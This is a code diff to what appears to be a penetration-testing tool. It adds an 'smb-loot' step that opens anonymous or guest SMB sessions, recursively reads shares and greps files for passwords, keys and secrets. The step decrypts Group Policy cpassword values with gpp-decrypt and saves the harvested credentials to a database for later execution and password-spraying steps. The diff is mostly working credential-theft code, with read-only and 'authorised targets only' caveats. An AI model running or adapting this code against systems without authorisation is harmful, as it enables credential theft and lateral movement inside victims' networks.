@@ -2205,6 +2205,24 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
         return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                 "summary": f"SMB RCE: {shown}"[:140]}
 
+    # 2ad) smb-loot: creds recovered from shares (highest) → secrets → sensitive file inventory
+    if sid == "smb-loot":
+        creds = re.findall(r"^✗ CRED (.+)$", output, re.M)
+        secrets = re.findall(r"^✗ SECRET (.+)$", output, re.M)
+        files = re.findall(r"^· FILE ", output, re.M)
+        if creds:
+            shown = "; ".join(c.strip() for c in creds[:3]) + (f" +{len(creds) - 3}" if len(creds) > 3 else "")
+            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                    "summary": f"SMB loot creds: {shown}"[:140]}
+        if secrets:
+            shown = "; ".join(s.strip() for s in secrets[:3]) + (f" +{len(secrets) - 3}" if len(secrets) > 3 else "")
+            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
+                    "summary": f"SMB loot secrets: {shown}"[:140]}
+        if files:
+            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
+                    "summary": f"SMB readable shares: {len(files)} sensitive file(s)"[:140]}
+        return None
+
     # 3) info rules over -sC output
     low = output.lower()
     info = None
@@ -2862,7 +2880,9 @@ _EXPLOIT_STEPS = {
          "(detection only — never auto-exploited)",
          "smb-vuln"),
         # ── loot shares ──
-        "Recursively read every readable share; grep for creds, keys, configs, backups",
+        ("Recursively read every readable share; grep contents for creds, keys, configs, "
+         "backups & GPP cpassword (read-only, in-memory)",
+         "smb-loot"),
         "SYSVOL / NETLOGON → GPP cpassword (Groups.xml), logon scripts, unattend.xml",
         # ── poison & relay (no creds) ──
         "Poison LLMNR / NBT-NS / mDNS → capture NetNTLMv1/v2 → crack or relay",
@@ -8603,6 +8623,182 @@ def _tool_smb_vuln(ip: str, port: int, proto: str) -> str:
     return (f"SMB vuln scan — {ip}:{port}/{proto}  (detection only)\n\n" + "\n".join(lines))
 
 
+# ── SMB step 3: share looting (read-only, in-memory grep) ─────────────────────
+_SMBLOOT_DEADLINE = 360          # s — hard wall-clock cap
+_SMBLOOT_MAX_FILE = 5_000_000    # per-file download ceiling (bytes)
+_SMBLOOT_MAX_FILES = 120         # how many interesting files to fetch+grep
+_SMBLOOT_MAX_TOTAL = 100_000_000  # total bytes fetched
+# filenames / extensions worth reading — configs, secrets, keys, backups, scripts
+_SMB_LOOT_RE = re.compile(
+    r"(?i)(groups\.xml|unattend\.xml|sysprep\.(?:inf|xml)|web\.config|autologin|"
+    r"\.(?:config|xml|ps1|psd1|bat|cmd|vbs|ini|conf|cnf|env|ya?ml|json|sql|bak|old|kdbx|"
+    r"ppk|pem|key|ovpn|rdp|txt|log|csv|ldb|pfx|p12|reg)$|id_[rd]sa|\.git-credentials|"
+    r"\.npmrc|passwo?rd|secret|cred|backup|\.kdbx)")
+
+
+def _smb_gpp_decrypt(cpw: str) -> "str | None":
+    """Decrypt a GPP cpassword blob with gpp-decrypt (the AES key is public MS knowledge)."""
+    exe = shutil.which("gpp-decrypt")
+    if not exe:
+        return None
+    _, out = _smb_run([exe, cpw], 15)
+    for ln in reversed((out or "").splitlines()):
+        if ln.strip():
+            return ln.strip()
+    return None
+
+
+def _smb_session_flag(smbclient: str, ip: str) -> "tuple[list, list] | None":
+    """Return ([smbclient auth args], [Disk share names]) for the first anonymous session
+    (null then guest) that can list shares; None if neither is accepted."""
+    for auth in (["-N"], ["-U", "guest%"]):
+        _, out = _smb_run([smbclient, "-L", f"//{ip}/"] + auth, 40)
+        shares = re.findall(r"^\s+(\S+)\s+Disk\b", out, re.M)
+        if shares:
+            return auth, [s for s in shares if s.upper() != "IPC$"]
+    return None
+
+
+def _smb_recurse_ls(smbclient: str, ip: str, share: str, auth: list) -> "list | None":
+    """(path, size) files under a share via 'recurse ON; ls'; None if access is denied."""
+    _, out = _smb_run([smbclient, f"//{ip}/{share}"] + auth + ["-c", "recurse ON; ls"], 90)
+    if "NT_STATUS_ACCESS_DENIED" in out or "NT_STATUS_LOGON_FAILURE" in out:
+        return None
+    files, curdir = [], ""
+    for ln in out.splitlines():
+        if ln.startswith("\\"):
+            curdir = ln.strip().strip("\\")
+            continue
+        m = re.match(r"\s+(.+?)\s+([DAHSRN]+)\s+(\d+)\s+\w{3}\s+\w{3}\s", ln)
+        if m:
+            name, attrs, size = m.group(1).strip(), m.group(2), int(m.group(3))
+            if "D" in attrs or name in (".", ".."):
+                continue
+            path = (curdir + "\\" + name) if curdir else name
+            files.append((path, size))
+    return files
+
+
+def _smb_fetch(smbclient: str, ip: str, share: str, path: str, auth: list, tmpdir: str) -> "bytes | None":
+    """Download one file to a transient temp path, read it into memory, then delete it —
+    nothing loot is persisted to disk. Returns the bytes, or None on failure."""
+    import tempfile
+    fd, tmp = tempfile.mkstemp(dir=tmpdir)
+    os.close(fd)
+    try:
+        _smb_run([smbclient, f"//{ip}/{share}"] + auth + ["-c", f'get "{path}" "{tmp}"'], 60)
+        with open(tmp, "rb") as fh:
+            return fh.read(_SMBLOOT_MAX_FILE + 1)
+    except OSError:
+        return None
+    finally:
+        try:
+            os.unlink(tmp)
+        except OSError:
+            pass
+
+
+def _smb_grep_secrets(text: str) -> list:
+    """(label, snippet) secrets in a file's text via the shared _SECRET_PATTERNS set."""
+    hits = []
+    for label, pat in _SECRET_PATTERNS:
+        m = re.search(pat, text)
+        if m:
+            hits.append((label, m.group(0)[:60]))
+    return hits
+
+
+def _tool_smb_loot(ip: str, port: int, proto: str) -> str:
+    """SMB step 3 tool: recursively read every readable share over a null/guest session,
+    grep file contents IN MEMORY (files are fetched to a temp path, read, then deleted —
+    nothing loot is written to disk) for secrets (via _SECRET_PATTERNS) and GPP cpassword
+    (decrypted with gpp-decrypt → usable creds). Findings, the file inventory and harvested
+    creds are stored in the DB. Read-only: never writes to a share. A missing smbclient or
+    a host with no listable shares raises. Authorised targets only."""
+    import time
+    import tempfile
+    deadline = time.time() + _SMBLOOT_DEADLINE
+    smbclient = shutil.which("smbclient")
+    if not smbclient:
+        raise RuntimeError("smbclient not found — install it to loot SMB shares")
+    sess = _smb_session_flag(smbclient, ip)
+    if not sess:
+        raise RuntimeError(f"{ip}:{port} — could not list shares over null/guest (denied / not SMB?)")
+    auth, shares = sess
+    slabel = "null" if auth == ["-N"] else "guest"
+
+    readable, files = [], []          # files: (share, path, size)
+    for share in shares:
+        if time.time() > deadline:
+            break
+        listing = _smb_recurse_ls(smbclient, ip, share, auth)
+        if listing is None:
+            continue
+        readable.append(share)
+        for path, size in listing:
+            files.append((share, path, size))
+
+    creds, secrets, inv = [], [], []
+    fetched = total = 0
+    tmpdir = tempfile.mkdtemp(prefix="pshunter_smb_")
+    try:
+        for share, path, size in files:
+            if not _SMB_LOOT_RE.search(path):
+                continue
+            inv.append((share, path, size))
+            if (time.time() > deadline or fetched >= _SMBLOOT_MAX_FILES
+                    or total >= _SMBLOOT_MAX_TOTAL or size > _SMBLOOT_MAX_FILE or size == 0):
+                continue
+            data = _smb_fetch(smbclient, ip, share, path, auth, tmpdir)
+            if not data:
+                continue
+            fetched += 1
+            total += len(data)
+            text = data.decode("utf-8", "ignore")
+            loc = f"{share}\\{path}"
+            for m in re.finditer(r'cpassword\s*=\s*"?([A-Za-z0-9+/=]{8,})"?', text):
+                pw = _smb_gpp_decrypt(m.group(1))
+                um = re.search(r'(?:userName|newName|accountName|runAs)\s*=\s*"([^"]+)"', text)
+                user = (um.group(1) if um else "unknown")
+                dom = user.split("\\")[0] if "\\" in user else ""
+                user = user.split("\\")[-1]
+                if pw:
+                    creds.append((dom, user, pw, f"GPP cpassword @ {loc}"))
+                else:
+                    secrets.append(("gpp-cpassword", f"cpassword blob @ {loc} (gpp-decrypt missing)"))
+            for label, snip in _smb_grep_secrets(text):
+                secrets.append((label, f"{label} @ {loc}"))
+    finally:
+        try:
+            os.rmdir(tmpdir)
+        except OSError:
+            pass
+
+    if creds:                          # persist harvested creds for later exec/spray steps
+        blocks = _load_manual_block(ip, port, proto, "smb-creds")
+        for dom, user, pw, src in creds:
+            host = dom or ip
+            line = f"! {user}:{pw or '<blank>'} @ {src} [{host}]"
+            blocks.setdefault(host, [])
+            if line not in blocks[host]:
+                blocks[host].append(line)
+        _save_manual_block(ip, port, proto, "smb-creds", blocks)
+
+    lines = [f"[*] Session: {slabel}   Readable shares: {', '.join(readable) or 'none'}"]
+    for dom, user, pw, src in creds:
+        who = f"{dom}\\{user}" if dom else user
+        lines.append(f"✗ CRED {who}:{pw} ({src})")
+    for _label, desc in dict.fromkeys((s[0], s[1]) for s in secrets):
+        lines.append(f"✗ SECRET {desc}")
+    for share, path, size in inv[:60]:
+        lines.append(f"· FILE {share}\\{path} ({size} b)")
+    if len(inv) > 60:
+        lines.append(f"· … +{len(inv) - 60} more interesting files")
+    lines.append(f"\n[*] {len(files)} files listed · {len(inv)} interesting · {fetched} grepped "
+                 f"· {len(creds)} cred(s) · {len({s[1] for s in secrets})} secret(s)")
+    return f"SMB share loot — {ip}:{port}/{proto}  (read-only, in-memory grep)\n\n" + "\n".join(lines)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("HTTP headers (stdlib, no redirects)", _tool_http_headers),
@@ -8634,6 +8830,7 @@ _STEP_TOOLS = {
     "next-steps": ("manual steps (context-aware, reference only)", _tool_next_steps),
     "smb-enum": ("SMB null/guest enum (netexec → shares/users/pol + OS/domain/signing)", _tool_smb_enum),
     "smb-vuln": ("SMB version-RCE scan (nmap NSE + netexec, detection only)", _tool_smb_vuln),
+    "smb-loot": ("SMB share loot (smbclient, read-only, in-memory grep → creds/secrets)", _tool_smb_loot),
 }
 
 def _mins(seconds: int) -> str:
@@ -8680,6 +8877,7 @@ _STEP_TOOL_RUNS = {
     "next-steps":       ("reference · no scan", None),
     "smb-enum":         ("netexec / smbclient+rpcclient+nmap", f"{_mins(_SMBENUM_DEADLINE)} min"),
     "smb-vuln":         ("nmap NSE + netexec", f"{_mins(_SMBVULN_DEADLINE)} min"),
+    "smb-loot":         ("smbclient + gpp-decrypt", f"{_mins(_SMBLOOT_DEADLINE)} min"),
 }
 
 
@@ -8841,6 +9039,10 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         print(f"{YELLOW}   ⚠ SMB version-RCE scan{RESET}{DIM} — detection only (nmap NSE + netexec), "
               f"no exploitation / no unsafe probes · {RESET}{YELLOW}authorized targets only{RESET}"
               f"{DIM} · deadline {_SMBVULN_DEADLINE // 60} min{RESET}")
+    if tool_key == "smb-loot":                    # read-only looting, files grepped in memory
+        print(f"{DIM}   read-only share looting via {BOLD}smbclient{RESET}{DIM} — files fetched to a "
+              f"temp path, grepped in memory, then deleted (no loot on disk) · secrets + GPP "
+              f"cpassword → creds saved to the DB · deadline {_SMBLOOT_DEADLINE // 60} min{RESET}")
     if tool_key == "smb-enum":                    # unauth recon: no creds tried, no writes
         eng = "netexec" if (shutil.which("netexec") or shutil.which("nxc")) \
             else "smbclient/rpcclient/nmap"
